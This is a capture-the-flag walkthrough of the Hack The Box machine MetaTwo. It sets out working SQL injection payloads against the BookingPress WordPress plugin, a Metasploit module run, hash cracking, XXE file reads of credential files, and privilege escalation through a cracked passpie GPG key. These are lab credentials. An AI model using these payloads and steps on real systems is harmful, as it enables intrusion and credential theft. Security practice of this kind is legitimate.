# MetaTwo

**IP**: `10.10.11.186`

**Hostname**: `metatwo.htb`

## Discovery

A quick nmap scan shows three ports open:
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### FTP

Connecting to the FTP port reveals it is running `ProFTPD Server (Debian)`. Anonymous login is not available.

### HTTP

A verbose curl of `metatwo.htb` returns an `HTTP 302` with the location `http://metapress.htb`. Update `/etc/hosts` to include that name.

A subsequent curl of `http://metapress.htb/` returns what appears to be a Wordpress installation. The headers reveal it's running on `PHP/8.0.24`.

Browsing the source of the index page reveals the WP version: `<meta name="generator" content="WordPress 5.6.2" />` which was released on `February 22, 2021`. Seems old.

## Wordpress

Running `wpscan` against the instance reveals a number of vulnerabilities. One of which is for a plugin called "BookingPress" which is vulnerable to unauthenticated SQL injection.

```
$ wpscan --url http://metapress.htb --plugins-detection=aggressive
[+] bookingpress-appointment-booking
 | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
 | Last Updated: 2023-03-04T13:08:00.000Z
 | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | [!] The version is out of date, the latest version is 1.0.53
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: BookingPress < 1.0.11 - Unauthenticated SQL Injection
 |     Fixed in: 1.0.11
 |     References:
 |      - https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739
 |      - https://plugins.trac.wordpress.org/changeset/2684789
 |
 | [!] Title: BookingPress < 1.0.31 - Unauthenticated IDOR in appointment_id
 |     Fixed in: 1.0.31
 |     References:
 |      - https://wpscan.com/vulnerability/8a7bd9f6-2789-474b-a237-01c643fdfba7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4340
 |
 | Version: 1.0.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | Confirmed By: Translation File (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'
```

### CVE-2022-0739

A search for that plugin at that version reveals a number of pages associated with the CVE `CVE-2022-0739`. Per the [wpscan PoC](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357) we can determine if the vulnerability exists with the following request:
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: curl/7.87.0
Accept: */*
Content-Length: 169
Content-Type: application/x-www-form-urlencoded
Connection: close

action=bookingpress_front_get_category_services&_wpnonce=345a1d7f10&category_id=1&total_service=1000) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -
```

Which returns the following response:

```json
[
  {
    "bookingpress_service_id": "10.5.15-MariaDB-0+deb11u1",
    "bookingpress_category_id": "Debian 11",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]
```

Here we can see the SQL variables interpolated. A quick search reveals the [WP database schema](https://codex.wordpress.org/Database_Description). Let's see how many users exist in that table.

Request:
```
action=bookingpress_front_get_category_services&_wpnonce=345a1d7f10&category_id=1&total_service=1000) UNION ALL SELECT count(*),1,2,3,4,5,6,7,8 from wp_users-- -
```

Response:
```json
[
  {
    "bookingpress_service_id": "2",
	...
  }
]
```

Now we know we have two users. Let's extract their information one at a time given the `wp_users` schema:

```
action=bookingpress_front_get_category_services&_wpnonce=345a1d7f10&category_id=1&total_service=1000) UNION ALL SELECT user_login,user_pass,user_email,1,2,3,4,5,6 FROM wp_users LIMIT 1-- -
```

Response:

```json
[
  {
    "bookingpress_service_id": "admin",
    "bookingpress_category_id": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.",
    "bookingpress_service_name": "admin@metapress.htb",
	...
  }
]
```

The first user details are:
- user_login: `admin`
- user_pass: `$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.`
- user_email: `admin@metapress.htb`
- user_status: `0`

Let's get the second user:

```
action=bookingpress_front_get_category_services&_wpnonce=345a1d7f10&category_id=1&total_service=1000) UNION ALL SELECT user_login,user_pass,user_email,1,2,3,4,5,6 FROM wp_users LIMIT 1 OFFSET 1-- -
```

Response:

```json
[
  {
    "bookingpress_service_id": "manager",
    "bookingpress_category_id": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70",
    "bookingpress_service_name": "manager@metapress.htb",
	...
  }
]
```

The second user details are:
- user_login: `manager`
- user_pass: `$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70`
- user_email: `manager@metapress.htb`
- user_status: `0`

#### Alternative Method

We can search the metasploit database for the CVE:

```
msf6 > search cve:2022-0739

Matching Modules
================

   #  Name                                                     Disclosure Date  Rank    Check  Description
   -  ----                                                     ---------------  ----    -----  -----------
   0  auxiliary/gather/wp_bookingpress_category_services_sqli  2022-02-28       normal  Yes    Wordpress BookingPress bookingpress_front_get_category_services SQLi
```

Run the metasploit module:
```
msf6 > use gather/wp_bookingpress_category_services_sqli
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set rhosts metapress.htb
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set TARGETURI /events/
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > run
[*] Running module against 10.10.11.186

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Extracting credential information
Wordpress User Credentials
==========================

 Username  Email                  Hash
 --------  -----                  ----
 admin     admin@metapress.htb    $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
 manager   manager@metapress.htb  $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70

[*] Auxiliary module execution completed
```

### Cracking the Hashes

Let's crack the dumped hashes with `hashcat`. First we need to identify which hash type these are:

```shell
$ hashid '$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70'
Analyzing '$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70'
[+] Wordpress ≥ v2.6.2 
[+] Joomla ≥ v2.5.18 
[+] PHPass' Portable Hash 
```

Let's check this against hashcat's hash table:

```shell
$ hashcat -h | egrep -i 'wordpress|joomla|phpass'
    400 | phpass   | Generic KDF
```

Let's start hashcat:

```shell
$ hashcat -m 400 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
```
- `-m 400` set's the hash type to "phpass"
- `-a 0` set's the type of attach to a dictionary attack
- `-o cracked.txt` outputs the found passwords to the specified file

Fairly early on, we see that hashcat was able to crack the manager password: `partylikearockstar`. Let's login.

### CVE-2021-29447

From our wpscan output earlier, the following vulnerability was listed:

```
 | [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
 |     Fixed in: 5.6.3
 |     References:
 |      - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/29378
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh
 |      - https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/
 |      - https://hackerone.com/reports/1095645
 |      - https://www.youtube.com/watch?v=3NBxcmqCgt4
```

Visiting [https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5) we can see an example of how to exploit it using a wav upload and serving a malicious DTD.

There's also a good example of a working exploit [here](https://github.com/motikan2010/CVE-2021-29447).

Using this XXE vulnerability, we can read files from the system that the user running the webserver has access to. Let's see what we can get access to.

**/etc/passwd**

```
...
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
...
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

Notice the `jnelson` user and the home dirs of the `proftpd` and `ftp` users. It would be nice to dump the `wp-config.php` file to get a fuller picture. Looking at the default nginx config we can determine the root dir.

**/etc/nginx/sites-enabled/default**

```
    ...
        root /var/www/metapress.htb/blog;
    ...
```

The root of the WP install is `/var/www/metapress.htb/blog`. We can now get the `wp-config.php` file:

**wp-config.php**

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );
/** MySQL database username */
define( 'DB_USER', 'blog' );
/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
...
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
...
```

We now have the DB and FTP usernames and passwords.

- **ftp**: `metapress.htb`/`9NYS_ii@FyL_p5M2NvJ`
- **mysql**: `blog`/`635Aq@TdqrCwXFUZ`

## FTP

Let's login with our FTP credentials and see what we find.

```
ftp> ls
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
ftp> cd mailer
ftp> ls
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
ftp> get send_email.php
```

Something seems out of place with `send_email.php`. Opening that file reveals `jnelson`'s password, at least for the "mail" server.

```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   
$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";
$mail->addAddress("info@metapress.htb");
$mail->isHTML(true);
```

The password is the same for logging into the metapress.htb box, where we can get the first flag: `e1e9315a4fa942c5f28e8ae085c70a95`.

## System

Now that we are ssh'd in as `jnelson`, we can start on the system key. First, there's an interesting directory in `jnelson`'s home:

```
$ ls -al ~
...
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
...
```

[passpie](https://github.com/marcwebbie/passpie) appears to be a password manager. It looks like the root password may be stored in this password manager:

```
jnelson@meta2:~$ ls ~/.passpie/ssh/
jnelson.pass  root.pass
```

We can validate that with passpie:

```
jnelson@meta2:~$ passpie list
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
````

There's no luck retrieving the root password using his same user password. That would be too easy.

Fortunately, in the `~/.passpie/.keys` file is the GPG private key, which we can bruteforce with JTR. Let's download that, convert it to something JTR can parse and have a crack at it.

```
$ scp jnelson@metapress.htb:~/.passpie/.keys passpie.keys
# Separate the private key into a file
$ cat priv.key
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
...
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
$ gpg2john priv.key > hash.txt
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt 
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:05 DONE (2023-03-05 22:26) 0.1757g/s 28.82p/s 28.82c/s 28.82C/s peanut..blink182
```

What a classic! Now let's retrieve the root pass:

```
$ passpie copy --to stdout ssh
Passphrase: blink182
p7qfAZt4_A1xo_0x
```

Now we can login as root and retrieve the system key:

```
$ su - root
Password: p7qfAZt4_A1xo_0x
$ cat root.txt
a5467213ee09d8d481bf12f69eaf27d4
```

Great box! This was a fun one.
